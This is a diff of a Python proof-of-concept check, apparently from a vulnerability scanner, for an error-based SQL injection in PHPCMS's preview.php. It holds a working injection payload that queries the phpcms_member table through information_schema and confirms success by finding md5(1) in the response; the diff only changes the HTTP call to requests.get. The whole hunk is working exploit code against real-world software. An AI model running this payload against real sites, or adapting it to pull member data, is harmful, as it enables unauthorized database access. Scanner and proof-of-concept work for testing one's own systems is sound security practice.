@@ -36,9 +36,8 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg
             payload = "/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(1),0x3a,md5(1),0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a"
-            code, head, res, errcode, _ = hh.http("\"%s\"" % (url + payload))
-                       
-            m = re.search('c4ca4238a0b923820dcc509a6f75849b',res)
+            res = requests.get(url + payload)
+            m = re.search('c4ca4238a0b923820dcc509a6f75849b',res.text)
             if m:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
